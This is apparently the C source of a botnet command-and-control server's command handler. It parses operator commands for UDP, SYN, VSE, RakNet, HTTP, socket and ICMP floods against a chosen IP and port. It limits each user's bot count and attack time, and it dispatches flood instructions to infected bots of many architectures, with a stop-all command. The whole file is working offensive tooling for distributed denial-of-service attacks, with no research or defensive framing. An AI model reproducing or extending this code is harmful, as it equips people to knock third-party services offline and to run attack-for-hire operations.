#include "headers/command_handler.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_attack_command(const User *user, const char *command, char *response);
void handle_stopall_command(char *response);

void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             PINK "!misc - shows misc commands\r\n"
             "!attack - shows attack methods\r\n"
             "!help - shows this msg\r\n" RESET);
}

void handle_misc_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             PINK "!stopall - stops all atks\r\n"
             "!opthelp - see attack options\r\n"
             "!bots - list bots\r\n"
             "!clear - clear screen\r\n"
             "!exit - leave CNC\r\n" RESET);
}

void handle_attack_list_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             PINK "!vse - VSE Queries, udp generic\r\n"
             "!raknet - RakNet UnConnected+Magic ping flood\r\n"
             "!udp - raw/plain flood udp\r\n"
             "!syn - plain SYN Flood\r\n"
             "!socket - open connection spam\r\n"
             "!http - HTTP 1.1 GET flood\r\n"
             "!icmp - ICMP Echo flood\r\n" RESET);
}

void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RED "Optional Arguments:\r\n"
             "psize - packet size (max 64500 for ICMP-UDP-SYN)\r\n"
             "srcport - srcport,  static helps bypass sometimes (max 65500, UDP-SYN)\r\n"
             "botcount - number of bots to use (global)\r\n" RESET);
}

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 ||
           strncmp(command, "!syn", 4) == 0 ||
           strncmp(command, "!vse", 4) == 0 ||
           strncmp(command, "!raknet", 7) == 0 ||
           strncmp(command, "!http", 5) == 0 ||
           strncmp(command, "!socket", 7) == 0 ||
           strncmp(command, "!icmp", 5) == 0;
}

void handle_layer3_attack_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
    int time = 0, psize = 0, botcount = 0;
    int has_psize = 0, has_botcount = 0;
    char *args[32] = {0};
    int arg_count = 0;

    if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
        return;
    }

    if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (!validate_psize(psize, cmd)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                return;
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        if (botcount > user->maxbots) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mYou have exceeded your max bots (%d)\033[0m\n", user->maxbots);
            pthread_mutex_unlock(&bot_mutex);
            return;
        }
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }
    int sent_bots = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            char bot_command[MAX_COMMAND_LENGTH];
            if (has_psize)
                snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
            else
                snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            send(bots[i].socket, bot_command, strlen(bot_command), 0);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    char response[MAX_COMMAND_LENGTH];
    if (strlen(command) == 0)
        return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response, sizeof(response), RED "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response, strlen(response), 0);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(command, "!help") == 0) {
        handle_help_command(response);
        send(client_socket, response, strlen(response), 0);
        return;
    } else if (strcmp(command, "!misc") == 0) {
        handle_misc_command(response);
    } else if (strcmp(command, "!attack") == 0) {
        handle_attack_list_command(response);
    } else if (strcmp(command, "!bots") == 0) {
        handle_bots_command(response);
    } else if (strcmp(command, "!clear") == 0) {
        handle_clear_command(response);
    } else if (strcmp(command, "!opthelp") == 0) {
        handle_opthelp_command(response);
    } else if (strcmp(command, "!exit") == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response, strlen(response), 0);
        close(client_socket);
        return;
    } else if (strncmp(command, "!icmp", 5) == 0) {
        handle_layer3_attack_command(user, command, response);
    } else if (is_attack_command(command)) {
        handle_attack_command(user, command, response);
    } else if (strcmp(command, "!stopall") == 0) {
        handle_stopall_command(response);
    } else {
        snprintf(response, sizeof(response), RED "\rCommand not found\n" RESET);
    }

    send(client_socket, response, strlen(response), 0);
}

void handle_attack_command(const User *user, const char *command, char *response) {
    char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH] = {0};
    int port = 0, time = 0, srcport = 0, psize = 0, botcount = 0;
    int has_srcport = 0, has_psize = 0, has_botcount = 0;
    char *args[32] = {0};
    int arg_count = 0;
    int is_icmp = strcmp(command, "!icmp") == 0;

    if (is_icmp) {
        if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !icmp <ipv4> <time> [options]\033[0m\n");
            return;
        }
    } else {
        if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr) < 4) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !method <ipv4> <dport> <time> [options]\033[0m\n");
            return;
        }
    }

    if (!validate_ip(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP or time\033[0m\n");
        return;
    }

    if (!is_icmp && !validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid port\033[0m\n");
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport argument\033[0m\n");
                return;
            }
            if (is_icmp || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!http") == 0 || strcmp(cmd, "!socket") == 0 || strcmp(cmd, "!raknet") == 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31msrcport not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (not an integer)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (srcport > 0) {
                if (!validate_srcport(srcport)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport!\033[0m\n");
                    return;
                }
            }
            has_srcport = 1;
        } else if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!raknet") == 0 || is_icmp)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (!validate_psize(psize, cmd)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                return;
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        if (botcount > user->maxbots) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mYou have exceeded your max bots (%d)\033[0m\n", user->maxbots);
            pthread_mutex_unlock(&bot_mutex);
            return;
        }
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }
    int sent_bots = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            char bot_command[MAX_COMMAND_LENGTH];
            if (is_icmp) {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            } else {
                if (has_srcport && has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d psize=%d", cmd, ip, port, time, srcport, psize);
                else if (has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d", cmd, ip, port, time, srcport);
                else if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d psize=%d", cmd, ip, port, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d", cmd, ip, port, time);
            }
            send(bots[i].socket, bot_command, strlen(bot_command), 0);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
}

void handle_bots_command(char *response) {
    int valid_bots = 0;
    int arch_count[12] = {0};
    const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
    
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        for (int j = i + 1; j < bot_count; j++) {
            if (!bots[j].is_valid) continue;
            if (bots[i].address.sin_addr.s_addr == bots[j].address.sin_addr.s_addr) {
                bots[i].is_valid = 0;
                break;
            }
        }
    }

    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            valid_bots++;
            for (int j = 0; j < 12; j++) {
                if (strcmp(bots[i].arch, arch_names[j]) == 0) {
                    arch_count[j]++;
                    break;
                }
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    int offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "All bots: %d\r\n" RESET, valid_bots);
    for (int i = 0; i < 12; i++) {
        if (arch_count[i] > 0) {
            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, BLUE "%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
        }
    }
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_stopall_command(char *response) {
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        send(bots[i].socket, "stop", strlen("stop"), 0);
    }
    pthread_mutex_unlock(&bot_mutex);
    snprintf(response, MAX_COMMAND_LENGTH, "\rAttempting to stop attacks...\n");
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
}